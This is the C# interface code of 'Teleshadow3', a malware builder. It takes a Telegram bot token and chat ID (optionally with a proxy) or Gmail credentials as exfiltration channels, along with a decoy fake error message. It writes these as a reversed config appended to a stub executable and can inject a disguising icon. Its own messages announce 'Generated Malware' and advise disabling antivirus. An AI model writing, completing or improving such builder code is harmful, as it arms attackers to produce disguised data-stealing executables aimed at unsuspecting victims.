using MaterialSkin;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Teleshadow3.Properties;

namespace Teleshadow3
{
    public partial class UI : Form
    {
        #region Variables
        private int FakeErrorType = 1;
        private bool SelectedIcon;
        private string IconPath;
        #endregion

        #region Constructor
        public UI()
        {
            InitializeComponent();
            new DropShaddow().ApplyShadows(this);
            CheckForIllegalCrossThreadCalls = false;
        }
        #endregion

        #region Events

        #region Load
        private void Form1_Load(object sender, EventArgs e)
        {
            console.Clear();
            console.Write("Teleshadow3 Started" + Environment.NewLine, true);
            console.Write("Machine Name: ".PadRight(5, ' '), false);
            console.Write(Environment.MachineName + Environment.NewLine, false);
            console.Write("Username: ".PadRight(5, ' '), false);
            console.Write(Environment.UserName + Environment.NewLine, false);
            console.Write("OS: ".PadRight(5, ' '), false);
            console.Write(Environment.OSVersion.VersionString + Environment.NewLine, false);
            console.Write(string.Empty.PadLeft(42, '=') + Environment.NewLine, false);
        }
        #endregion

        #region ExitButton
        private void ExitButton_Click(object sender, EventArgs e)
        {
            Close();
        }
        #endregion

        #region ErrorButton
        private void BtnError_Click(object sender, EventArgs e)
        {
            if (!MCBMessage.Checked)
            {
                MessageBox.Show("Fake Message is disabled!", "No fake message");
                return;
            }

            MessageBoxIcon MI = new MessageBoxIcon();

            switch (FakeErrorType)
            {
                case 1:
                    MI = MessageBoxIcon.Error;
                    break;
                case 2:
                    MI = MessageBoxIcon.Information;
                    break;
                case 3:
                    MI = MessageBoxIcon.Warning;
                    break;

            }
            MessageBox.Show(ErrorContent.ContentText, ErrorTitle.ContentText, MessageBoxButtons.OK, MI);
        }
        #endregion

        #region ButtonGenerateSignature
        private void BtnGenerateSignature_Click(object sender, EventArgs e)
        {
            MessageBox.Show("This feature is not available, Comming soon!", "Not Available", MessageBoxButtons.OK, MessageBoxIcon.Information);

        }
        #endregion

        #region ButtonBuild
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            #region CheckInputs
            if (MRTelegram.Checked)
            {
                if (string.IsNullOrWhiteSpace(telegramDialog.Token))
                {
                    MessageBox.Show("Configuration Missing!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning); return;
                }
                if (string.IsNullOrWhiteSpace(telegramDialog.ChatID))
                {
                    MessageBox.Show("Configuration Missing!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning); return;
                }

                if (telegramDialog.UseProxy)
                {
                    if (string.IsNullOrWhiteSpace(telegramDialog.ProxyIP))
                    {
                        MessageBox.Show("Configuration Missing!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning); return;
                    }
                    if (string.IsNullOrWhiteSpace(telegramDialog.ProxyPort))
                    {
                        MessageBox.Show("Configuration Missing!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning); return;
                    }
                }
            }
            else
            {
                if (string.IsNullOrWhiteSpace(gmailDialog.Gmail))
                {
                    MessageBox.Show("Configuration Missing!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning); return;
                }
                if (string.IsNullOrWhiteSpace(gmailDialog.Password))
                {
                    MessageBox.Show("Configuration Missing!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning); return;
                }
                if (string.IsNullOrWhiteSpace(gmailDialog.Reciever))
                {
                    MessageBox.Show("Configuration Missing!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning); return;
                }
            }
            #endregion

            #region SaveFileDialog
            var sfd = new SaveFileDialog
            {
                Filter = "Excutable |*.exe"
            };
            if (sfd.ShowDialog() != DialogResult.OK)
                return;
            #endregion

            #region CreateConfig
            console.Write("Creating Config...\r\n");
            string Config = CreateConfig();
            if (Encoding.UTF8.GetBytes(Config).Length >= 1024)
            {
                MessageBox.Show("Bad/Large Config !", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            #endregion

            #region Config Stub
            console.Write("Generating Stub...\r\n");

            byte[] Data = Encoding.UTF8.GetBytes(Config);
            byte[] Trim = new byte[1024 - Data.Length];

            Data = Reverse(Combine(Data, Trim));
            byte[] Stub = File.ReadAllBytes("Stubx");
            File.WriteAllBytes(sfd.FileName, Stub);
            #endregion

            #region CheckWrite
            if (!File.Exists(sfd.FileName))
            {
                MessageBox.Show("Malware Not Exists, Try Disabling your AntiVirus", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                console.Write("Stub Removed!\r\n");

                return;
            }
            #endregion

            #region InjectIcon
            if (SelectedIcon)
            {
                console.Write("Injecting Icon...\r\n");
                Core.InjectIcon(sfd.FileName, IconPath);
            }
            #endregion

            #region Initialize Stub
            console.Write("Initializing Stub...\r\n");
            Stub = File.ReadAllBytes(sfd.FileName);
            Array.Resize(ref Stub, Stub.Length + 1024);
            for (int i = 0; i < Data.Length; i++)
            {
                Stub[(Stub.Length - 1024) + i] = Data[i];
            }
            File.WriteAllBytes(sfd.FileName, Stub);
            #endregion

            #region CheckWrite
            if (!File.Exists(sfd.FileName))
            {
                MessageBox.Show("Malware Not Exists, Try Disabling your AntiVirus", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                console.Write("Stub Removed!\r\n");

                return;
            }
            #endregion

            console.Write("Done!\r\n");

            MessageBox.Show("Generated Malware: \r\n\"" + sfd.FileName + "\" !", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        #endregion

        #region ButtonAbout
        private void BtnAbout_Click(object sender, EventArgs e)
        {
            console.Write("Coded by EternalCØder" + Environment.NewLine, true);
            MessageBox.Show("Tesleshadow3 Coded by EternalCØDER"
                + Environment.NewLine
                + Environment.NewLine
                + "Thanks to"
                + Environment.NewLine
                + "Shadow And Parsing Digital Security Team");

        }
        #endregion

        #region ButtonSelectIcon
        private void BtnSelectIcon_Click(object sender, EventArgs e)
        {
            var ofd = new OpenFileDialog();
            ofd.Filter = "Icon |*.ico";
            var result = ofd.ShowDialog();
            if (result == DialogResult.OK)
            {
                Icon.Image = Image.FromFile(ofd.FileName);
                console.Write("Updated Icon" + Environment.NewLine, true);
                SelectedIcon = true;
                IconPath = ofd.FileName;
            }
        }
        #endregion

        #region MessageIconClicked
        private void PBIconError_Click(object sender, EventArgs e)
        {
            FakeErrorType++;
            if (FakeErrorType > 3)
                FakeErrorType = 1;
            switch (FakeErrorType)
            {
                case 1:
                    PBIconError.Image = Resources.Error;
                    break;
                case 2:
                    PBIconError.Image = Resources.Info;
                    break;
                case 3:
                    PBIconError.Image = Resources.Warning;
                    break;

            }
        }
        #endregion

        #region TransferMethodChanged
        private void TransferMethodChanged(object sender, EventArgs e)
        {
            if (MRTelegram.Checked)
            {
                gmailDialog.Visible = false;
                telegramDialog.Visible = true;
            }
            else
            {
                gmailDialog.Visible = true;
                telegramDialog.Visible = false;
            }
        }
        #endregion

        #endregion

        #region Functions

        #region GetFakeMessage
        string GetFakeMessage()
        {
            string SplitChar = "~";
            string Config = null;
            if (!MCBMessage.Checked)
            {
                return "0"
                      + SplitChar
                      + "0"
                      + SplitChar
                      + "0";
            }
            else
            {
                if (FakeErrorType == 3)
                { Config = "Warning"; }
                else if (FakeErrorType == 2)
                { Config = "Info"; }
                else if (FakeErrorType == 1)
                { Config = "Error"; }
                return Config
                       + SplitChar
                       + ErrorTitle.ContentText
                       + SplitChar
                       + ErrorContent.ContentText;
            }
        }
        #endregion

        #region CreateConfig
        private string CreateConfig()
        {
            string Config;
            string SplitChar = "`";

            if (MRTelegram.Checked)
            {
                var ApiInfo = telegramDialog;

                if (ApiInfo.UseProxy)
                {
                    #region Config1
                    // Structure :
                    // TransferMethod ` UseProxy ` ProxyIP ~ ProxyPort ` ApiToken ` UserChatID ` FakeMessage
                    Config = "0"
                             + SplitChar
                             + "1"
                             + SplitChar
                             + ApiInfo.ProxyIP
                             + "~"
                             + ApiInfo.ProxyPort
                             + SplitChar
                             + ApiInfo.Token
                             + SplitChar
                             + ApiInfo.ChatID
                             + SplitChar
                             + GetFakeMessage();
                    #endregion
                }
                else
                {
                    #region Config2
                    // Structure :
                    // TransferMethod ` UseProxy ` ApiToken ` UserChatID ` FakeMessage
                    Config = "0"
                             + SplitChar
                             + "0"
                             + SplitChar
                             + ApiInfo.Token
                             + SplitChar
                             + ApiInfo.ChatID
                             + SplitChar
                             + GetFakeMessage();
                    #endregion
                }
            }
            else
            {
                #region Config3
                var GmailInfo = gmailDialog;
                // Structure :
                // TransferMethod ` EmailAddress ` Password ` RecieverEmailAddress ` FakeMessage
                Config = "1"
                         + SplitChar
                         + GmailInfo.Gmail
                         + "~"
                         + GmailInfo.Password
                         + "~"
                         + GmailInfo.Reciever
                         + SplitChar
                         + GetFakeMessage();
                #endregion
            }
            return Config;
        }
        #endregion

        #region Combine
        private byte[] Combine(byte[] FirstBytes, byte[] SecondBytes)
        {
            byte[] CombinedBytes = new byte[FirstBytes.Length + SecondBytes.Length];
            Buffer.BlockCopy(FirstBytes, 0, CombinedBytes, 0, FirstBytes.Length);
            Buffer.BlockCopy(SecondBytes, 0, CombinedBytes, FirstBytes.Length, SecondBytes.Length);
            return CombinedBytes;
        }
        #endregion

        #region Reverse
        private byte[] Reverse(byte[] Data)
        {
            byte[] Temp = new byte[Data.Length];
            for (int i = 0; i < Data.Length; i++)
            {
                Temp[(Temp.Length - 1) - i] = Data[i];
            }
            return Temp;
        }
        #endregion

        #endregion
    }

    #region DropShadow
    public class DropShaddow
    {

        [EditorBrowsable(EditorBrowsableState.Never)]
        [DllImport("dwmapi.dll")]
        public static extern int DwmExtendFrameIntoClientArea(IntPtr hWnd, ref DropShaddow.MARGINS pMarInset);

        [EditorBrowsable(EditorBrowsableState.Never)]
        [DllImport("dwmapi.dll")]
        public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);

        [EditorBrowsable(EditorBrowsableState.Never)]
        [DllImport("dwmapi.dll")]
        public static extern int DwmIsCompositionEnabled(ref int pfEnabled);

        [EditorBrowsable(EditorBrowsableState.Never)]
        public static bool IsCompositionEnabled()
        {
            if (Environment.OSVersion.Version.Major < 6)
                return false;
            DropShaddow.DwmIsCompositionEnabled(out bool enabled);
            return enabled;
        }

        [DllImport("dwmapi.dll")]
        private static extern int DwmIsCompositionEnabled(out bool enabled);

        [DllImport("Gdi32.dll")]
        private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

        public void ApplyShadows(Form form)
        {
            int attrValue = 2;
            DropShaddow.DwmSetWindowAttribute(form.Handle, 2, ref attrValue, 4);
            DropShaddow.MARGINS pMarInset = new DropShaddow.MARGINS()
            {
                bottomHeight = 1,
                leftWidth = 0,
                rightWidth = 0,
                topHeight = 0
            };
            DropShaddow.DwmExtendFrameIntoClientArea(form.Handle, ref pMarInset);
        }

        [EditorBrowsable(EditorBrowsableState.Never)]
        public struct MARGINS
        {
            public int leftWidth;
            public int rightWidth;
            public int topHeight;
            public int bottomHeight;
        }
    }
    #endregion
}
